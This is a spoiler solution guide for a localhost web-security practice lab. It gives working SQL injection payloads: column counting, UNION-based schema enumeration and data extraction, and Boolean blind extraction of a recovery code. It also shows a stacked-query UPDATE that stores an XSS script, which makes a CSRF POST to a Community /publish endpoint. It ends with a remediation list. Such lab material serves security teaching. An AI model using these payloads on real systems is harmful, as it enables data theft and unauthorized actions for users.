# Spoiler Solution Guide

This file contains method and payload spoilers for the localhost practice lab.
Attempt the tasks in README.md first.

## Task 1 — reasoning

The Academy record query selects six columns in this order:

~~~text
1 record_id
2 display_name
3 program
4 gpa
5 advisor_note
6 access_key
~~~

The page visibly renders columns 2, 3, 4, and 5. Use the Access key field as
the injection point. Its value is placed inside a quoted SQL string.

Column count discovery:

~~~text
Saira#42' ORDER BY 1 LIMIT 1 -- -
...
Saira#42' ORDER BY 6 LIMIT 1 -- -
Saira#42' ORDER BY 7 LIMIT 1 -- -
~~~

The first failing ordinal is 7, so the count is six.

Visible-column marker:

~~~text
' UNION SELECT 0,'UNION_OK','lab',0.00,'', '' -- -
~~~

Metadata enumeration:

~~~text
' UNION SELECT 0,GROUP_CONCAT(table_name),'lab',0.00,'','' FROM information_schema.tables WHERE table_schema=DATABASE() -- -
~~~

Then enumerate columns with information_schema.columns. The two relevant tables
are learner_records and certification_awards.

Readable multi-table extraction:

~~~text
' UNION SELECT 0,GROUP_CONCAT(CONCAT(l.portal_id,' | ',l.display_name,' | ',a.badge_code,' | ',a.completion_score) ORDER BY l.portal_id SEPARATOR '<br>'),'lab',0.00,'','' FROM learner_records l JOIN certification_awards a ON l.record_id=a.record_id -- -
~~~

If output truncates, add WHERE conditions on l.portal_id and retrieve in
multiple batches.

## Task 2 — reasoning

The Helpdesk endpoint does not display SELECT values. It only displays whether
the query returned a row. That creates a Boolean oracle.

Keep Portal ID as P-4102 and inject into Case reference. First ensure syntax
and the Boolean difference work:

~~~text
CASE-900' OR 1=1 -- -
CASE-900' AND 1=2 -- -
~~~

The recovery code is stored in learner_records. A length condition has this
shape:

~~~text
CASE-900' AND LENGTH((SELECT recovery_code FROM learner_records WHERE portal_id='P-4102'))=12 -- -
~~~

Adjust the number until the page says Case status is available.

A first-character condition has this shape:

~~~text
CASE-900' AND SUBSTRING((SELECT recovery_code FROM learner_records WHERE portal_id='P-4102'),1,1)='v' -- -
~~~

Try an alphabet suited to the generated format: lowercase letters, digits, and
the hyphen. Repeat for positions 1 through 4. This is deliberately a manual
practice loop; in an exam, explain the inference process and show one or two
representative conditions.

## Task 3 — reasoning

The Academy database pool enables multipleStatements. The Academy page places
advisor_note directly into the HTML response without escaping it. Community
uses an HttpOnly session cookie but its /publish endpoint accepts a normal
form-encoded POST with no CSRF token.

First prove an update with a harmless marker:

~~~text
Saira#42'; UPDATE learner_records SET advisor_note='XSS_TEST' WHERE portal_id='P-4102'; -- -
~~~

Reload the Academy record normally to see the stored value. The initial stacked
request returns the SELECT result before the UPDATE, so the reload matters.

The final payload in the Academy Access key field is:

~~~text
Saira#42'; UPDATE learner_records SET advisor_note=CONCAT('<script>fetch("http://localhost:3101/publish",{"method":"POST","headers":{"content-type":"application/x-www-form-urlencoded"},"body":"message=Checkpoint%3A+',gpa,'","credentials":"include"});</script>') WHERE portal_id='P-4102'; -- -
~~~

The form parser decodes the body to:

~~~text
Checkpoint: <GPA>
~~~

Log in to Study Community as saira_khan first, store the payload, then reload
the Academy record normally. Refresh the Community feed to verify the post.
A CORS error in the Academy Console can be expected: it can prevent reading the
cross-origin response after the Community server has already processed the
request.

## Task 4 — remediation outline

1. Replace Academy SQL concatenation with pool.execute and placeholders.
2. Remove multipleStatements from the Academy pool configuration.
3. Escape display_name, program, gpa, and advisor_note before rendering, or use
   an autoescaping template engine.
4. Generate a random session-bound CSRF token, put it in the Community form,
   and require it in /publish.
5. Set Secure and an appropriate SameSite policy on cookies in HTTPS
   deployments.
6. Use password hashes rather than plaintext access keys.
7. Use database accounts with minimum required privileges.
